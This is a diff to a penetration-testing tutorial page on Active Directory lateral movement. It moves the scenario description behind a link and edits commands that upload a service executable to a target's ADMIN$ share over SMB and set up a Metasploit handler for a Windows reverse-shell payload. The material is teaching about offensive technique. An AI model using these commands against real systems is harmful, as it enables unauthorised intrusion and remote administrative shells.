@@ -1,22 +1,6 @@
 # Example
 
-Suppose the following scenario where we have obtained two sets of AD credentials:&#x20;
-
-a. Low privileges (user)
-
-b. Administrative access (admin)&#x20;
-
-Our goal is to obtain a shell session on an _IIS_ server with administrative privileges. There are 2 servers we will be working with:
-
-a. Intermediary (`jmp.test.com`)
-
-b. IIS (`iis.test.com`)
-
-Let's assume that the Intermediary server have no data that will be interesting to us, and it simply functions as an intermediary to get to the _IIS_ server. The main goal is the _IIS_ server, which is only accessible/routable from the intermediary server due to network restrictions, firewalls, etc.
-
-The first set of AD credential allows us to gain a remote shell session on the intermediary machine (`jmp.domain`), via SSH.&#x20;
-
-However, the _IIS_ server does not expose a SSH service. Thus, we need to make use of the session we have on the intermediary server to move laterally to the _IIS_ server (`iis.domain`) using the obtained admin credentials, to gain a remote session with administrative privileges.&#x20;
+Refer to the section labelled ["Example scenario"](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/windows-active-directory/lateral-movement-and-pivoting/example-scenario) to understand the setup we will be working with.
 
 ### (1) Using `sc.exe`&#x20;
 
@@ -63,7 +47,7 @@ Sharename       Type      Comment
  ADMIN$         Disk      Remote Admin
 ...
 
-$ smbclient -c "put <service_exec_name>.exe" -U admin -W test.com '//iis.test.com/ADMIN$/' <password>
+$ smbclient -c "put <service_exec_name>.exe" -U admin -W test.com '//iis.test.com/ADMIN$/'
 ```
 {% endcode %}
 
@@ -78,7 +62,7 @@ msf6> use exploit/multi/handler
 msf6 exploit(multi/handler) > set LHOST <local_addr>
 msf6 exploit(multi/handler) > set LPORT 9999 
 msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
-msf6 exploit(multi/handler) > exploit 
+msf6 exploit(multi/handler) > run 
 ```
 {% endcode %}
 
